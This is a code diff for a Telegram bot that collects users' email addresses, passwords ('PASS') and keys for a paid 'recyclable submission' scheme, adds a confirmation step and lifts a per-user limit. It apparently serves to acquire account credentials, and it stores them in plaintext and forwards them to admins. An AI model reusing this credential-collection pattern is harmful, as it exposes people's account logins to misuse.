@@ -1,4 +1,5 @@
 import re
+import logging
 from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes, ConversationHandler
@@ -6,7 +7,9 @@ from config import ADMIN_IDS
 import database as db
 from keyboards import cancel_keyboard, main_menu_keyboard, admin_submission_actions_keyboard
 
-WAIT_EMAIL, WAIT_PASS, WAIT_KEY = range(3)
+logger = logging.getLogger(__name__)
+
+WAIT_EMAIL, WAIT_PASS, WAIT_KEY, WAIT_CONFIRM = range(4)
 
 EMAIL_REGEX = re.compile(r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$")
 
@@ -16,80 +19,22 @@ def key_help_keyboard() -> InlineKeyboardMarkup:
         [InlineKeyboardButton("🎥 Video Tutorial (Coming Soon)", url="https://t.me/LALAJIIIIIIIIII")]
     ])
 
+def review_confirm_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("✅ Confirm & Submit", callback_data="sub_confirm")],
+        [
+            InlineKeyboardButton("🔄 Start Over / Edit", callback_data="sub_restart"),
+            InlineKeyboardButton("❌ Cancel", callback_data="sub_cancel")
+        ]
+    ])
+
 async def start_submission(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    is_admin = user_id in ADMIN_IDS
+    context.user_data.clear()
 
-    # Check existing submission
-    existing = await db.get_submission_by_user(user_id)
-    if existing:
-        status = existing["status"]
-        if status == "PENDING":
-            q_info = await db.get_queue_info(existing["id"])
-            await update.message.reply_text(
-                f"⚠️ <b>You already have a pending submission!</b>\n\n"
-                f"🆔 <b>Submission ID:</b> #{existing['id']}\n"
-                f"🔢 <b>Current Queue Position:</b> #{q_info['position']} "
-                f"({q_info['ahead_count']} ahead of you)\n"
-                f"📅 <b>Submitted Date:</b> {existing['created_at']}\n\n"
-                f"Please wait while our team reviews it.",
-                parse_mode=ParseMode.HTML,
-                reply_markup=main_menu_keyboard(is_admin)
-            )
-            return ConversationHandler.END
-
-        if status == "IN_REVIEW":
-            await update.message.reply_text(
-                f"🔍 <b>Your submission is currently In Review!</b>\n\n"
-                f"🆔 <b>Submission ID:</b> #{existing['id']}\n"
-                f"📅 <b>Submitted Date:</b> {existing['created_at']}\n"
-                f"Our admin team is currently reviewing your details. "
-                f"You will receive an instant notification when approved or updated.",
-                parse_mode=ParseMode.HTML,
-                reply_markup=main_menu_keyboard(is_admin)
-            )
-            return ConversationHandler.END
-
-        if status == "ACCEPTED":
-            await update.message.reply_text(
-                f"✅ <b>You already have an Accepted submission!</b>\n\n"
-                f"🆔 <b>Submission ID:</b> #{existing['id']}\n"
-                f"Your payment will be made soon. Multiple submissions are not permitted.",
-                parse_mode=ParseMode.HTML,
-                reply_markup=main_menu_keyboard(is_admin)
-            )
-            return ConversationHandler.END
-
-        if status == "DISAPPROVED":
-            await update.message.reply_text(
-                f"❌ <b>Your previous submission was Disapproved.</b>\n\n"
-                f"🆔 <b>Submission ID:</b> #{existing['id']}\n"
-                f"📝 <b>Reason:</b> {existing.get('admin_notes') or 'Verification failed'}\n\n"
-                f"If you believe this was an error, please click <b>⚖️ Submit Appeal</b> from the menu.",
-                parse_mode=ParseMode.HTML,
-                reply_markup=main_menu_keyboard(is_admin)
-            )
-            return ConversationHandler.END
-
-        if status == "CAN_RESUBMIT":
-            context.user_data["resubmitting_id"] = existing["id"]
-            await update.message.reply_text(
-                f"🔄 <b>Resubmitting Your Information</b>\n\n"
-                f"Your previous submission (#`{existing['id']}`) has been unlocked for resubmission.\n"
-                f"📝 <i>Note: {existing.get('admin_notes') or 'Please provide corrected details.'}</i>\n"
-                f"💰 <b>Rate of Refund:</b> You can potentially get <b>₹370</b>!\n\n"
-                f"<b>Step 1 of 3:</b> Please enter your <b>Email Address</b>:",
-                parse_mode=ParseMode.HTML,
-                reply_markup=cancel_keyboard()
-            )
-            return WAIT_EMAIL
-
-    # Fresh submission
-    context.user_data["resubmitting_id"] = None
+    # Step 1: Prompt for Email (Multiple submissions per user are fully allowed!)
     intro_text = (
-        "♻️ <b>Recyclable Submission Program</b>\n"
-        "💰 <b>Rate of Refund:</b> You can potentially get <b>₹370</b> per submission!\n\n"
-        "📧 <b>Step 1 of 3: Enter Your Email Address</b>\n"
+        "📧 <b>Step 1 of 3: Enter Your Email Address</b>\n\n"
+        "Please enter your email address:\n"
         "<i>(Note: Only 1 query per email is allowed. Duplicate emails are strictly rejected instantly.)</i>\n\n"
         "<i>Or press ❌ Cancel anytime to stop.</i>"
     )
@@ -105,6 +50,7 @@ async def receive_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = update.effective_user.id in ADMIN_IDS
 
     if email == "❌ Cancel":
+        context.user_data.clear()
         await update.message.reply_text("Submission cancelled.", reply_markup=main_menu_keyboard(is_admin))
         return ConversationHandler.END
 
@@ -118,15 +64,14 @@ async def receive_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return WAIT_EMAIL
 
     clean_email = email.lower()
-    resubmitting_id = context.user_data.get("resubmitting_id")
 
     # INSTANT DUPLICATE EMAIL CHECK
-    is_dup = await db.is_email_registered(clean_email, exclude_submission_id=resubmitting_id)
+    is_dup = await db.is_email_registered(clean_email)
     if is_dup:
         await update.message.reply_text(
             f"🚫 <b>SUBMISSION REJECTED: DUPLICATE EMAIL</b>\n\n"
             f"The email <code>{clean_email}</code> is <b>already registered</b> in our database "
-            f"or was submitted by another user previously.\n\n"
+            f"or was submitted previously.\n\n"
             f"⚠️ <b>Policy:</b> Only <b>1 query per email</b> is allowed. "
             f"Duplicate entries are strictly disallowed.\n\n"
             f"Your submission has been cancelled immediately.",
@@ -153,6 +98,7 @@ async def receive_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = update.effective_user.id in ADMIN_IDS
 
     if pass_text == "❌ Cancel":
+        context.user_data.clear()
         await update.message.reply_text("Submission cancelled.", reply_markup=main_menu_keyboard(is_admin))
         return ConversationHandler.END
 
@@ -170,7 +116,7 @@ async def receive_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"✅ PASS recorded!\n\n"
         f"🔑 <b>Step 3 of 3: Enter Key</b>\n"
         f"Please enter your <b>Key</b>:\n\n"
-        f"<i>💡 Need help with finding or getting your Key? Tap the Help button below:</i>",
+        f"<i>💡 Need help with finding your Key? Tap the Help button below:</i>",
         parse_mode=ParseMode.HTML,
         reply_markup=key_help_keyboard()
     )
@@ -178,10 +124,10 @@ async def receive_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     key_text = update.message.text.strip()
-    user = update.effective_user
-    is_admin = user.id in ADMIN_IDS
+    is_admin = update.effective_user.id in ADMIN_IDS
 
     if key_text == "❌ Cancel":
+        context.user_data.clear()
         await update.message.reply_text("Submission cancelled.", reply_markup=main_menu_keyboard(is_admin))
         return ConversationHandler.END
 
@@ -193,36 +139,67 @@ async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return WAIT_KEY
 
     context.user_data["sub_key"] = key_text
-    email = context.user_data["sub_email"]
-    pass_code = context.user_data["sub_pass"]
-    key_code = key_text
-    resubmitting_id = context.user_data.get("resubmitting_id")
 
-    # Double check duplicate email at commit time
-    is_dup = await db.is_email_registered(email, exclude_submission_id=resubmitting_id)
-    if is_dup:
-        await update.message.reply_text(
-            f"🚫 <b>Duplicate Email Detected</b>\n\n"
-            f"The email <code>{email}</code> was already registered. Submission cancelled.",
-            parse_mode=ParseMode.HTML,
-            reply_markup=main_menu_keyboard(is_admin)
+    email = context.user_data.get("sub_email")
+    pass_code = context.user_data.get("sub_pass")
+    key_code = key_text
+
+    # Step 4: Show Review & Confirmation with Confirm, Start Over, or Cancel buttons
+    review_card = (
+        "📋 <b>Please Review Your Details Before Submitting:</b>\n"
+        "━━━━━━━━━━━━━━━━━━━\n"
+        f"📧 <b>Email:</b> <code>{email}</code>\n"
+        f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
+        f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
+        "━━━━━━━━━━━━━━━━━━━\n"
+        "<i>If you made a mistake, tap <b>🔄 Start Over / Edit</b> or <b>❌ Cancel</b>. "
+        "If everything looks correct, tap <b>✅ Confirm & Submit</b>.</i>"
+    )
+
+    await update.message.reply_text(
+        review_card,
+        parse_mode=ParseMode.HTML,
+        reply_markup=review_confirm_keyboard()
+    )
+    return WAIT_CONFIRM
+
+async def sub_confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user = update.effective_user
+    is_admin = user.id in ADMIN_IDS
+
+    email = context.user_data.get("sub_email")
+    pass_code = context.user_data.get("sub_pass")
+    key_code = context.user_data.get("sub_key")
+
+    if not email or not pass_code or not key_code:
+        await query.edit_message_text(
+            "⚠️ Session expired or missing details. Please click 📝 Submit Information to try again.",
+            reply_markup=None
         )
         context.user_data.clear()
         return ConversationHandler.END
 
-    if resubmitting_id:
-        await db.update_submission_resubmit(resubmitting_id, email, pass_code, key_code)
-        submission_id = resubmitting_id
-        submission_obj = await db.get_submission_by_id(submission_id)
-    else:
-        submission_id = await db.create_submission(
-            user_id=user.id,
-            username=user.username,
-            email=email,
-            pass_code=pass_code,
-            key_code=key_code
+    # Final duplicate email check before commit
+    is_dup = await db.is_email_registered(email)
+    if is_dup:
+        await query.edit_message_text(
+            f"🚫 <b>Duplicate Email Detected:</b> <code>{email}</code> was already registered. Submission cancelled.",
+            parse_mode=ParseMode.HTML
         )
-        submission_obj = await db.get_submission_by_id(submission_id)
+        context.user_data.clear()
+        return ConversationHandler.END
+
+    # Save to database
+    submission_id = await db.create_submission(
+        user_id=user.id,
+        username=user.username,
+        email=email,
+        pass_code=pass_code,
+        key_code=key_code
+    )
+    submission_obj = await db.get_submission_by_id(submission_id)
 
     # Queue Calculation
     queue_info = await db.get_queue_info(submission_id)
@@ -231,18 +208,16 @@ async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     total_pending = queue_info["total_pending"]
     submitted_date = submission_obj["created_at"]
 
-    # Clear user context data
     context.user_data.clear()
 
-    # Success message to User
+    # Success confirmation message to User
     user_confirm = (
-        f"🎉 <b>Recyclable Submission Received Successfully!</b>\n"
+        f"🎉 <b>Submission Received Successfully!</b>\n"
         f"━━━━━━━━━━━━━━━━━━━\n"
         f"🆔 <b>Submission ID:</b> #{submission_id}\n"
         f"📧 <b>Email:</b> <code>{email}</code>\n"
         f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
         f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
-        f"💰 <b>Potential Refund:</b> <b>₹370</b>\n"
         f"📅 <b>Submitted Date:</b> {submitted_date}\n"
         f"━━━━━━━━━━━━━━━━━━━\n\n"
         f"🔢 <b>Queue Information:</b>\n"
@@ -253,24 +228,28 @@ async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📢 <b>Next Steps:</b>\n"
         f"1. When an admin starts reviewing, your status will change to <b>In Review</b>.\n"
         f"2. Once accepted, you will receive: <i>'status changed to accepted your payment will be made soon'</i>.\n"
-        f"3. You can track your live position anytime using the <b>📊 Check Status & Queue</b> button."
+        f"3. You can track your position anytime using the <b>📊 Check Status & Queue</b> button."
     )
-    await update.message.reply_text(
+    await query.edit_message_text(
         user_confirm,
-        parse_mode=ParseMode.HTML,
+        parse_mode=ParseMode.HTML
+    )
+
+    await context.bot.send_message(
+        chat_id=user.id,
+        text="👇 Use the menu below to check your status or submit another:",
         reply_markup=main_menu_keyboard(is_admin)
     )
 
     # Alert to Admins
     admin_alert = (
-        f"🔔 <b>New Recyclable Submission Received!</b>\n"
+        f"🔔 <b>New Submission Received!</b>\n"
         f"━━━━━━━━━━━━━━━━━━━\n"
         f"🆔 <b>Submission ID:</b> #{submission_id}\n"
         f"👤 <b>User:</b> @{user.username or 'NoUsername'} (ID: <code>{user.id}</code>)\n"
         f"📧 <b>Email:</b> <code>{email}</code>\n"
         f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
         f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
-        f"💰 <b>Potential Refund:</b> ₹370\n"
         f"📅 <b>Date:</b> {submitted_date}\n"
         f"🔢 <b>Queue Position:</b> #{position} (Total Pending: {total_pending})\n"
         f"📊 <b>Status:</b> ⏳ PENDING\n"
@@ -284,7 +263,35 @@ async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode=ParseMode.HTML,
                 reply_markup=admin_submission_actions_keyboard(submission_id, "PENDING")
             )
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"Failed to notify admin {admin_id}: {e}")
 
+    return ConversationHandler.END
+
+async def sub_restart_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer("Starting over...")
+    context.user_data.clear()
+
+    await query.edit_message_text(
+        "🔄 <b>Starting over.</b>\n\n"
+        "📧 <b>Step 1 of 3: Enter Your Email Address</b>\n"
+        "Please enter your email address:\n"
+        "<i>(Note: Only 1 query per email is allowed.)</i>",
+        parse_mode=ParseMode.HTML
+    )
+    return WAIT_EMAIL
+
+async def sub_cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer("Cancelled.")
+    context.user_data.clear()
+    is_admin = update.effective_user.id in ADMIN_IDS
+
+    await query.edit_message_text("❌ Submission cancelled.")
+    await context.bot.send_message(
+        chat_id=update.effective_user.id,
+        text="Main menu:",
+        reply_markup=main_menu_keyboard(is_admin)
+    )
     return ConversationHandler.END
